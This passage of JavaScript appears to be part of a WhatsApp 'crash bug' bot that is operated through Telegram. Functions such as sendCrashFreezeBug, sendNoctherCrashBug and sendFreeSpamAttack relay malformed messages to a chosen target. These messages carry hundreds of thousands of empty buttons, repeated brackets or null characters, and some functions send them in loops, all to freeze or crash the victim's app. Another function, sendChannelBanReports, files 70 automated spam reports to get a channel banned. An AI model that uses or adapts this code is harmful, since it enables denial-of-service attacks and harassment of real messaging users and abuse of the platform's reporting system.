        }
      }
    }
  };
  try {
    if (!sock || !targetJid) {
      console.log("❌ DelayBebasSpamBawzhhh: Sock atau target tidak valid");
      return;
    }
    await sock.relayMessage(targetJid, payload, {
      participant: {
        jid: targetJid
      },
      noSelfSync: true
    });
    const delay = 2000 + Math.random() * 3000;
    await sleep(delay);
  } catch (err) {
    console.log("❌ DelayBebasSpamBawzhhh error: " + err.message);
    const retryDelay = 5000 + Math.random() * 5000;
    await sleep(retryDelay);
  }
}
async function sendCrashFreezeBug(sock, targetJid) {
  const helper = {};
  helper.helper = " maklo ";
  helper.crashMessage = "one_crash_message";
  const H = helper;
  try {
    const body1 = {};
    body1.text = "";
    const buttonArray1 = {};
    buttonArray1.length = 500000;
    const payload1 = {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: body1,
              nativeFlowMessage: {
                buttons: Array.from(buttonArray1, () => ({}))
              }
            }
          }
        }
      },
      body2 = {};
    body2.text = H.helper;
    const payload2 = {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: body2,
              nativeFlowMessage: {
                buttons: "ြ".repeat(600000)
              }
            }
          }
        }
      },
      body3 = {};
    body3.text = "࿗";
    const payload3 = {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: body3,
              nativeFlowMessage: {
                buttons: H.crashMessage.repeat(20000)
              }
            }
          }
        }
      },
      relayOpts1 = {};
    relayOpts1.noSelfSync = true;
    await sock.relayMessage(targetJid, payload1, relayOpts1);
    const relayOpts2 = {};
    relayOpts2.noSelfSync = true;
    await sock.relayMessage(targetJid, payload2, relayOpts2);
    const relayOpts3 = {};
    relayOpts3.noSelfSync = true;
    await sock.relayMessage(targetJid, payload3, relayOpts3);
  } catch (err) {
    console.log(chalk.yellow("⚠️ DelayXcombo error: " + err.message));
    throw err;
  }
}
async function sendChannelBanReports(sock, channelInput) {
  const normalizeChannelJid = function (raw) {
    const trimmed = String(raw || "").trim();
    if (!trimmed) return null;
    if (trimmed.includes("@newsletter")) return trimmed;
    const inviteMatch = trimmed.match(/whatsapp\.com\/channel\/([A-Za-z0-9_-]+)/i);
    if (inviteMatch) return inviteMatch[1] + "@newsletter";
    const cleaned = trimmed.replace(/[^A-Za-z0-9_-]/g, "");
    if (!cleaned || cleaned.length < 5) return null;
    return cleaned + "@newsletter";
  };
  const channelJid = normalizeChannelJid(channelInput);
  if (!channelJid) throw new Error("Valid channel link/code required");
  let reportCount = 0;
  for (let index = 0; index < 70; index++) {
    try {
      typeof sock.sendMessage === "function" && (await sock.sendMessage(channelJid, {
        react: {
          text: "🚫",
          key: {
            remoteJid: channelJid,
            fromMe: true,
            id: "BAN" + Date.now()
          }
        }
      }));
      if (typeof sock.query === "function") {
        const iqAttrs = {};
        iqAttrs.to = "s.whatsapp.net";
        iqAttrs.type = "set";
        iqAttrs.xmlns = "w:chat:report";
        const reportAttrs = {};
        reportAttrs.jid = channelJid;
        reportAttrs.reason = "spam";
        const reportNode = {};
        reportNode.tag = "report";
        reportNode.attrs = reportAttrs;
        const iqNode = {};
        iqNode.tag = "iq";
        iqNode.attrs = iqAttrs;
        iqNode.content = [reportNode];
        await sock.query(iqNode);
      }
      reportCount++, console.log("[✅ CHANNEL] Report #" + reportCount + " → " + channelJid);
    } catch (err) {
      console.log("[❌ CHANNEL] " + err.message);
    }
    await new Promise(resolve => setTimeout(resolve, 2000));
  }
}
async function sendXFGXFCrashBug(sock, targetJid) {
  const helper = {};
  helper.lessThan = function (a, b) {
    return a < b;
  };
  helper.subtract = function (a, b) {
    return a - b;
  };
  helper.markdown = "Markdown";
  helper.wrongAnswer = "❌ Salah! Coba lagi";
  helper.paymentInfo = "payment_info";
  helper.concat = function (a, b) {
    return a + b;
  };
  helper.tagA = "xFGxf";
  helper.tagB = "NecXK";
  helper.concat2 = function (a, b) {
    return a + b;
  };
  helper.phoneNumber = "62×××××";
  helper.ctaCopy = "cta_copy";
  const H = helper;
  try {
    if (H.tagA === H.tagB) {
      const traits = ["Pemberani 🦁", "Pintar 🧠", "Baik hati 💖", "Lucu 😂", "Penyabar 🧘", "Kreatif 🎨"],
        pickedTrait = traits[Math.floor(Math.random() * traits.length)],
        opts = {};
      opts.parse_mode = H.markdown, ctx.reply("🧠 *Kepribadianmu:* " + pickedTrait, opts);
    } else {
      const buttonArray = {};
      buttonArray.length = 500000;
      const crashButton = {};
      crashButton.name = "one_crash_message";
      const bookingButton = {};
      bookingButton.name = "booking_status";
      bookingButton.bookingId = "succes";
      const voiceButton = {};
      voiceButton.name = "voice_call";
      voiceButton.phone_number = H.phoneNumber;
      const copyButton = {};
      copyButton.name = H.ctaCopy;
      const payload = {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: {
                text: " ",
                display_text: H.concat2(H.concat2(H.concat2(H.concat2("‌", "‍"), "​"), "\\u200A") + "\\0", "\\u00930")
              },
              nativeFlowMessage: {
                buttons: Array.from(buttonArray, () => ({}))
              },
              nativeFlowResponsMessage: {
                buttons: [crashButton, bookingButton, voiceButton, copyButton]
              }
            }
          }
        }
      };
      await sock.relayMessage(targetJid, payload, {});
    }
  } catch (err) {
    console.log(chalk.yellow("⚠️ CrashFreeze error: " + err.message));
    throw err;
  }
}
async function sendVideoCrashBug(sock, targetJid) {
  const uploadOpts = {};
  uploadOpts.upload = sock.waUploadToServer;
  const preparedMedia = await prepareWAMessageMedia({
      video: {
        url: "https://cdn.ornzora.eu.cc/ed7ebb66-9bf4-44b6-858a-b6b7405e53c5-FIORA.mp4"
      }
    }, uploadOpts),
    audienceMeta = {};
  audienceMeta.audienceType = 2;
  const videoContext = {};
  videoContext.pairedMediaType = 6;
  videoContext.statusSourceType = 0;
  videoContext.isGroupStatus = true;
  videoContext.statusAudienceMetadata = audienceMeta;
  const videoMessage = {
    ...preparedMedia.videoMessage
  };
  videoMessage.contextInfo = videoContext;
  const groupVideoOpts = {};
  groupVideoOpts.videoMessage = videoMessage;
  const generatedMessage = await generateWAMessageFromContent(targetJid, groupVideoOpts, {});
  await sock.relayMessage(targetJid, generatedMessage.message, {
    messageId: generatedMessage.key.id
  });
  const statusAudience = {};
  statusAudience.audienceType = 2;
  const statusContext = {};
  statusContext.pairedMediaType = 6;
  statusContext.statusSourceType = 0;
  statusContext.isGroupStatus = true;
  statusContext.statusAudienceMetadata = statusAudience;
  const msgAssociation = {};
  msgAssociation.associationType = 12;
  msgAssociation.parentMessageKey = generatedMessage.key;
  const msgCtxInfo = {};
  msgCtxInfo.messageAssociation = msgAssociation;
  await sock.relayMessage("status@broadcast", {
    groupStatusMessageV2: {
      message: {
        videoMessage: {
          ...preparedMedia.videoMessage,
          contextInfo: statusContext,
          inviteLinkGroupTypeV2: "DEFAULT"
        }
      }
    },
    messageContextInfo: msgCtxInfo
  }, {
    statusJidList: [targetJid],
    additionalNodes: [{
      tag: "meta",
      attrs: {
        status_setting: "contacts"
      },
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: {
            jid: targetJid
          },
          content: []
        }]
      }]
    }]
  });
}
async function sendNoctherCrashBug(sock, targetJid) {
  const helper = {};
  helper.concat = function (a, b) {
    return a + b;
  };
  helper.headerText = "𝙷𝙰𝙸 𝙺𝙸𝙳𝚉 𝚃𝙷𝙸𝚂 𝙸𝚂 𝙲𝙰𝙴𝙻𝙻";
  helper.crashName = "one_crash_message";
  helper.bookingName = "booking_status";
  helper.bookingId = "succes";
  helper.phoneNumber = "62×××××";
  helper.ctaCopy = "cta_copy";
  const H = helper;
  const headerObj = {};
  headerObj.title = "#NoctherRk28";
  const buttonArray1 = {};
  buttonArray1.length = 500000;
  const payload1 = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            header: headerObj,
            body: {
              text: H.concat("[{".repeat(1000), "}]".repeat(1000))
            },
            nativeFlowMessage: {
              buttons: Array.from(buttonArray1, () => ({}))
            }
          }
        }
      }
    },
    body2 = {};
  body2.text = H.headerText;
  const buttonArray2 = {};
  buttonArray2.length = 500000;
  const crashButton = {};
  crashButton.name = H.crashName;
  const bookingButton = {};
  bookingButton.name = H.bookingName;
  bookingButton.bookingId = H.bookingId;
  const voiceButton = {};
  voiceButton.name = "voice_call";
  voiceButton.phone_number = H.phoneNumber;
  const copyButton = {};
  copyButton.name = H.ctaCopy;
  const nativeFlowResponse = {};
  nativeFlowResponse.buttons = [crashButton, bookingButton, voiceButton, copyButton];
  const payload2 = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: body2,
          nativeFlowMessage: {
            buttons: Array.from(buttonArray2, () => ({})),
            nativeFlowResponsMessage: nativeFlowResponse
          }
        }
      }
    }
  };
  await sock.relayMessage(targetJid, payload1, {}), await sock.relayMessage(targetJid, payload2, {});
}
async function sendHmzListCrashBug(sock, targetJid) {
  const helper = {};
  helper.concat = function (a, b) {
    return a + b;
  };
  helper.concat2 = function (a, b) {
    return a + b;
  };
  const H = helper;
  try {
    const payload = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: {
              text: H.concat("Hmz", "\\n")
            },
            nativeFlowMessage: {
              messageParamsJson: "[".repeat(10000),
              buttons: H.concat2("\\0".repeat(250000), "".repeat(250000))
            }
          }
        }
      }
    };
    await sock.relayMessage(targetJid, payload, {
      participants: [{
        jid: targetJid
      }]
    });
  } catch (err) {}
}
async function sendCosmicPathBug(sock, targetJid) {
  const helper = {};
  helper.bodyText = "./#5#~";
  const H = helper;
  const payload = {
    groupStatusMessageV2: {
      message: {
        messageContextInfo: {},
        mediaMetadata: {},
        interactiveMessage: {
          body: {
            text: H.bodyText
          },
          nativeFlowMessage: {
            buttons: "".repeat(500000)
          }
        }
      }
    }
  };
  await sock.relayMessage(targetJid, payload, {
    participant: targetJid
  });
}
async function sendFreeSpamAttack(sock, targetJid) {
  const helper = {};
  helper.helper = "❌ ☇ Gagal menghubungi api, oba lagi nanti";
  helper.lessThan = function (a, b) {
    return a < b;
  };
  helper.equals = function (a, b) {
    return a === b;
  };
  helper.tagA = "gTtoE";
  helper.tagB = "PkjCh";
  helper.imageUrl = "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true";
  helper.imageMime = "image/jpeg";
  helper.mediaKey = "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=";
  helper.fileEncSha256 = "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=";
  helper.directPath = "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0";
  helper.midQualitySha = "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0=";
  helper.concat = function (a, b) {
    return a + b;
  };
  helper.concat2 = function (a, b) {
    return a + b;
  };
  helper.paymentReviewClick = "payment_review_click";
  helper.reviewAndPayment = "review_and_payment";
  helper.statusBroadcast = "status@broadcast";
  helper.metaTag = "meta";
  helper.mentionedTag = "mentioned_users";
  const H = helper;
  for (let index = 0; H.lessThan(index, 100); index++) {
    if (H.equals(H.tagA, H.tagB)) ctx.reply(H.helper);
    else {
      const imageInfo = {};
      imageInfo.url = H.imageUrl;
      imageInfo.mimetype = H.imageMime;
      imageInfo.fileSha256 = "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=";
      imageInfo.fileLength = 9999;
      imageInfo.height = 9999;
      imageInfo.width = 9999;
      imageInfo.mediaKey = H.mediaKey;
      imageInfo.fileEncSha256 = H.fileEncSha256;
      imageInfo.directPath = H.directPath;
      imageInfo.mediaKeyTimestamp = "1776937541";
      imageInfo.jpegThumbnail = null;
      imageInfo.caption = "X";
      imageInfo.scansSidecar = "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==";
      imageInfo.scanLengths = [10000000000000000000, 10000000000000000000, 10000000000000000000, 10000000000000000000];
      imageInfo.midQualityFileSha256 = H.midQualitySha;
      const header = {};
      header.imageMessage = imageInfo;
      const buttonArray = {};
      buttonArray.length = 499999;
      const payload1 = {
          groupStatusMessageV2: {
            message: {
              interactiveMessage: {
                header: header,
                body: {
                  text: H.concat("[".repeat(250000), "?".repeat(250000))
                },
                nativeFlowMessage: {
                  buttons: Array.from(buttonArray, () => ({}))
                }
              }
            }
          }
        },
        payload2 = {
          groupStatusMessage: {
            message: {
              interactiveMessage: {
                body: {
                  text: H.concat2(H.concat("‌​", "‌"))
                },
                nativeFlowMessage: {
                  buttons: [{
                    name: H.paymentReviewClick,
                    buttonParamsJson: JSON.stringify({
                      reference_id: "{".repeat(250000),
                      type: H.reviewAndPayment,
                      payment_settings: []
                    })
                  }]
                }
              }
            }
          }
        };
      await sock.relayMessage(H.statusBroadcast, payload1, {
        statusJidList: [targetJid],
        additionalNodes: [{
          tag: H.metaTag,
          attrs: {},
          content: [{
            tag: H.mentionedTag,
            attrs: {},
            content: [{
              tag: "to",
              attrs: {
                jid: targetJid
              },
              content: []
            }]
          }]
        }]
      }), await sock.relayMessage(H.statusBroadcast, payload2, {
        statusJidList: [targetJid],
        additionalNodes: [{
          tag: H.metaTag,
          attrs: {},
          content: [{
            tag: H.mentionedTag,
            attrs: {},
            content: [{
              tag: "to",
              attrs: {
                jid: targetJid
              },
              content: []
            }]
          }]
        }]
      });
    }
  }
}
(async () => {
  try {
    console.log(">>> G X I O N"), console.log(">>> SELAMAT DATANG!!!!"), loadAllData();
    const protectOpts = {};
    protectOpts.skipVM = true;
    const protectResult = PROTECT.runProtectChecks(protectOpts);
    if (protectResult) return;
    await validateTokenWithMirrors(), console.log(chalk.hex("#f1fa8c")("[ ~ ] Menghubungkan ke WhatsApp...")), await startWhatsAppConnection();
    let secondsWaited = 0;
    while (secondsWaited < 30) {
      await new Promise(resolve => setTimeout(resolve, 1000)), secondsWaited++;
    }
    console.log(chalk.yellow("[ ⚠️ ] WhatsApp belum connect, lanjut ke Telegram..."));
    console.log(chalk.yellow("⏳ [ Webhook キャッシュのクリア ]"));
    try {
      const webhookOpts = {};
      webhookOpts.drop_pending_updates = true;
      await bot.telegram.callApi("deleteWebhook", webhookOpts), console.log(chalk.green("✅ [ Webhook がクリアされました ]"));
    } catch (err) {}
    let launched = false;
    while (!launched) {
      try {
        const launchOpts = {};
        launchOpts.dropPendingUpdates = true;
        await bot.launch(launchOpts), console.log(chalk.green.bold("[ ✓ ] ") + chalk.white("X-PROTECT (TELEGRAM ONLINE)")), launched = true;
      } catch (err) {
        const errMsg = err.message || String(err);
        if (errMsg.includes("409") || errMsg.includes("Conflict")) console.log(chalk.yellow("[ ⚠️ ] Telegram 409. Nunggu 3 detik...")), await new Promise(resolve => setTimeout(resolve, 3000));
        else throw err;
      }
    }
    global.lastPing = Date.now();
    const heartbeat = setInterval(() => {
      global.lastPing = Date.now();
      const opts = {};
      opts.skipVM = true;
      PROTECT.runProtectChecks(opts);
      global.HEALTH_CHECK && typeof global.HEALTH_CHECK.sendHeartbeat === "function" && global.HEALTH_CHECK.sendHeartbeat();
    }, 1000);
    if (heartbeat.unref) heartbeat.unref();
  } catch (fatalError) {
    console.log(chalk.red.bold("[ ✗ ] FATAL ERROR: ") + chalk.white(fatalError.message)), console.log(chalk.gray(fatalError.stack || "")), console.log(chalk.yellow("⚠️ Bot dimatikan oleh sistem, tapi INI BUKAN DARI SECRUITY ANTI BYPASS , ADA MASALAH KECIL YANG MEMBUAT HAL INI TERJADI!!!.")), process.exit(1);
  }
})();
